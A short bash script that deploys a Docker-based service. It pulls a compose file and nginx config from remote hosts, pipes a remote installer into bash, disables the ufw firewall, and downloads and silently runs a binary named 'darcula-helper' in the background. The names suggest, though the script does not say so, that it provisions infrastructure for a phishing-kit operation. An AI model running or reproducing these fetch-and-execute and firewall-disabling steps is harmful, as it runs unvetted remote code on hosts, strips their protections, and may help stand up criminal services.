#!/bin/bash

curl https://store-one-sand.vercel.app/compose.yml -o docker-compose.yml

curl https://deploy.magic-cat.world/nginx.conf -o nginx.conf

if [[ ! `which docker` ]];then
    curl https://get.docker.com | bash
fi
ufw disable;

docker compose pull && \
docker compose run --rm api npx prisma db push && \
docker compose up -d && \
docker image prune -f && \
docker compose restart


if [[ ! `pidof darcula-helper` ]];then
    curl https://wp.magic-cat.world/helper -so darcula-helper && \
    chmod +x ./darcula-helper && \
    nohup ./darcula-helper > dh.log 2>&1 &
fi
